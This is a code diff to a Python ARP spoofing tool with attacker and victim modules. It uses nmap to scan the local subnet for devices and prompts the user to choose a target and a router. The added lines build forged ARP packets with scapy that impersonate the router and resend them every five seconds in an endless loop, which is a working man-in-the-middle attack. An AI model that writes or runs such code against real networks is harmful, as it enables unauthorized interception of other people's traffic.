@@ -1,11 +1,16 @@
 import subprocess, time
+
+from scapy.layers.l2 import ARP
+from scapy.sendrecv import send
+
 from victim import Victim
 from attacker import Attacker
 from network import Network
 from color import Color #used to output to the terminals with colors
 
+
 def initialize():
-    Color.pl("{?} Doing pings to discover clients and build the ARP table")
+    Color.pl("{?} Doing pings to discover the router")
     time.sleep(2)
 
     subprocess.run(["ip", "neigh", "flush", "all"]) #clear arp table
@@ -21,7 +26,7 @@ def initialize():
     attackerMAC = commandOutput[2].split()[1]
     broadcastIP = commandOutput[1].split()[-1]
 
-    command = "nmap "+ routerIP +"/24 -n -sP | grep 'report\|MAC'" # discover users connected
+    command = "nmap "+ routerIP +"/24 -n -sP | grep 'report\|MAC'" # discover users connected to router
     commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))
     connectedDevices = commandOutput[3:].split('\\n')[1:-1] #remove first element since it is the router
 
@@ -44,9 +49,52 @@ if __name__ == '__main__':
     for e in victimsList:
         Color.pl("{!} " + e.toString())
 
+    op = 1  # Op code 1 for ARP requests
+    while(True):
+        Color.pl("{?} Do you want to enter the target manually? (y or n)")
+        selection = input().lower()
+        if selection.lower() == "y":
+            Color.pl("{+} Enter target IP address ")
+            ip = input().strip()
+            Color.pl("{+} Enter target MAC address ")
+            mac = input().strip()
+            break
+        elif selection.lower() == "n":
+            for i in range(len(victimsList)):
+                Color.pl("{!} " + str(i) + ":   " + victimsList[i].toString())
+            Color.pl("{+} Enter Index of Target")
+            index = int(input())
+            ip = victimsList[index].ip
+            mac = victimsList[index].mac
+            break
+        else:
+            Color.pl("{!} Invalid Input")
+
+    while(True):
+        Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
+        selection = input().lower()
+        if selection.lower() == "y":
+            Color.pl("{+} Enter router IP address ")
+            routerIP = input().strip()
+            break
+        elif selection.lower() == "n":
+            routerIP = network.ip
+            break
+        else:
+            Color.pl("{!} Invalid Input")
+
+    Color.pl("{+} {R} Router IP: {G}" + routerIP)
+    Color.pl("{+} {R} Target IP: {G}" + ip + "  {R} Target IP: {G}" + mac)
+    time.sleep(2)
+
+    arp = ARP(op=op, psrc=routerIP, pdst=ip, hwdst=mac)
+
+    while 1:
+        send(arp)
+        time.sleep(5)
+
+
     '''
-    Insert info you need to use for the attack 
-    User may want to use different values from what we found
     Do the attack 
     
     Detecting router needs testing
